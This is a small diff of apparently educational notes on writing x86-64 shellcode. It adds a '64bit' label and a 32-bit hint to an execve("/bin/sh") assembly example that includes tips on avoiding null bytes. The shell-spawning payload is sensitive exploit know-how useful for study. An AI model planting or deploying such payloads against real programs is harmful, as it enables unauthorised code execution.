@@ -8,7 +8,7 @@ Compile the program and use `objdump` to pull apart the binary and get the opcod
 Avoid null bytes, they will likely kill the shellcode execution:  
 e.g. use `xor rax, rax` instead of `mov rax, 0`.  
 
-## Example execve("/bin/sh")
+## Example 64bit execve("/bin/sh")
 
 ```asm
 ; Compile with "nasm -f elf64 sh.asm -o sh.o"
@@ -23,6 +23,7 @@ _start:
     xor rsi, rsi;   ; Set RSI to 0
     xor rdx, rdx;   ; Set RDX to 0
     mov rbx, 0x68732f6e69622f2f;    ; Move "//bin/sh" into RBX (2 slashes to completely fill the register)
+   ; For 32 bit: push a 0 value to the stack, then //sh then /bin
     push rbx;   ; move "//bin/sh" to the stack
     mov rdi, rsp;   ; Pointer to "//bin/sh" in RDI
     mov al, 0x3b;   ; execve syscall number
